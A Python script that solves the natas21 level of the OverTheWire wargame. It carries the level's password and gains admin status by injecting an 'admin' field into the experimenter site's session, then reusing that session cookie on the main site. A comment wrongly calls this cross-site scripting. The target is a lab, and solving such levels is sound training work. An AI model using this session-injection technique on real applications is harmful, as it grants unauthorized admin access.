# Name: Michael Krakovsky
# Date: April 25, 2019
# Description: Create a script to break the code on natas21.
# Version: 1.0

from requests import Session
from pyperclip import copy

username = "natas21"
passwd = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
url = "http://natas21.natas.labs.overthewire.org/?debug=true"      # This is how we turn on the debug variables.
expUrl = "http://natas21-experimenter.natas.labs.overthewire.org/?debug=true"  

session = Session()

getResponse = session.post(expUrl, data={"submit": "1", "admin":"1"}, auth=(username, passwd))   
print(getResponse.text)
sessionPID = session.cookies["PHPSESSID"]      # We require this session PID to enact the cross site scripting vunerability
print(50 * '-')
getResponse = session.get(url, cookies={"PHPSESSID":sessionPID}, auth=(username, passwd))   
print(getResponse.text)
print(50 * '-')
copy(getResponse.text)